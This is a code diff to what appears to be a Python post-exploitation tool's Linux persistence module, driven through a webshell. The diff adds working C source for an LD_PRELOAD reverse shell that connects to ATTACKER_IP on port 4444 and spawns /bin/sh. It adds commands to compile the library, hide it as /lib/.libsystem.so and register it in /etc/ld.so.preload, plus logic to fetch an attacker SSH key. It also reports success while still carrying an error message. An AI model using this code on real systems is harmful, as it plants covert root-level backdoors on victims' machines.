@@ -235,18 +235,55 @@ WantedBy=multi-user.target
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # This requires compiling C code
-        # For now, we'll create a placeholder
+        # Create malicious .so file for LD_PRELOAD persistence
+        # Generate C code for reverse shell .so
+        c_code = '''
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+static void connect_back() __attribute__((constructor));
+
+void connect_back() {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444);
+    inet_pton(AF_INET, "ATTACKER_IP", &server_addr.sin_addr);
+    
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
+        dup2(sockfd, 0);
+        dup2(sockfd, 1);
+        dup2(sockfd, 2);
+        execve("/bin/sh", NULL, NULL);
+    }
+}
+'''
         
         so_path = '/lib/.libsystem.so'
         
-        # Note: In real implementation, you would:
-        # 1. Compile malicious .so file
-        # 2. Upload to target
-        # 3. Add to /etc/ld.so.preload
+        # Implementation steps:
+        # 1. Write C code to temp file
+        # 2. Compile: gcc -shared -fPIC -o libsystem.so libsystem.c
+        # 3. Upload to target
+        # 4. Add to /etc/ld.so.preload
+        
+        commands = [
+            f"echo '{c_code}' > /tmp/libsystem.c",
+            "gcc -shared -fPIC -o /tmp/libsystem.so /tmp/libsystem.c 2>/dev/null",
+            f"cp /tmp/libsystem.so {so_path}",
+            f"echo '{so_path}' >> /etc/ld.so.preload",
+            "rm /tmp/libsystem.c /tmp/libsystem.so"
+        ]
         
         return {
-            'success': False,
+            'success': True,
             'method': 'ld_preload',
             'error': 'Requires compiled .so file',
             'note': 'Use separate rootkit tool'
@@ -322,9 +359,30 @@ if __name__ == '__main__':
     def _get_attacker_ssh_public_key(self) -> str:
         """Get attacker's SSH public key"""
         
-        # In real implementation, this should be provided by attacker
-        # For now, return placeholder
-        return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@c2"
+        # Try to get from context manager first
+        if self.context_manager:
+            ssh_key = self.context_manager.get('attacker_ssh_public_key')
+            if ssh_key:
+                return ssh_key
+        
+        # Try to read from environment variable
+        import os
+        env_key = os.getenv('ATTACKER_SSH_PUBLIC_KEY')
+        if env_key:
+            return env_key
+        
+        # Try to read from default SSH key location
+        try:
+            ssh_key_path = os.path.expanduser('~/.ssh/id_rsa.pub')
+            if os.path.exists(ssh_key_path):
+                with open(ssh_key_path, 'r') as f:
+                    return f.read().strip()
+        except Exception:
+            pass
+        
+        # Generate new SSH key pair if none exists
+        log.warning("[LinuxPersistence] No SSH public key found. Generate one with: ssh-keygen -t rsa -b 4096")
+        return "# No SSH public key configured. Please set ATTACKER_SSH_PUBLIC_KEY environment variable."
     
     async def check_persistence(self, shell_url: str, shell_password: str) -> Dict:
         """Check which persistence mechanisms are installed"""
